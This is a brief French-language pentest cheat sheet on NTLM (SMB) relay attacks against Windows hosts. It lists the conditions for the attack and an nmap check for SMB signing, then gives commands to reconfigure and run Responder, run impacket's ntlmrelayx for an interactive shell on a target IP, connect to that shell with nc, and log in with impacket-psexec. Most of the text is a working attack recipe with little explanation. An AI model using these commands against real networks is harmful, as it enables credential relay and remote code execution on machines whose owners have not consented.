# NTLM Relay

Aussi appeler `SMB Relay`

Pour cela fonctionne, il faut que `SMB Signing soit desactiver` et l'utilisateur dont les identifiants sont relayer doit etre `administrateur` au niveau de la machine.

```sh
nmap --script=smb2-security-mode IP
# regarder le message de smb2-security-mode:
	Host script results:
	| smb2-security-mode: 
	|   311: 
	|_    Message signing enabled but not required

# Cela nous montre que notre attaque peut fonctionner car la signature est acitver et n'est pas requise.
```

En suite, il faut desactiver les services SMB et HTTP de responder.

```sh
sudo nano /usr/share/responder/Responder.conf
	[Responder Core]
	SMB = Off
	HTTP = Off
```

```sh
sudo responder -I eth0
```

Combiner avec ntlmrelayx de impacket l'ajouter de `-i` a la commande impacket-ntlmrelayx pour obtenir un shell sur la machine distante et utiliser nc pour interagire avec elle.

```sh
ntlmrelayx.py -t 192.168.179.132 -smb2support -i
```

```sh
nc 127.0.0.1 NTRELAYX_PORT
```

```sh
impacket-psexec username:password@target-ip
```

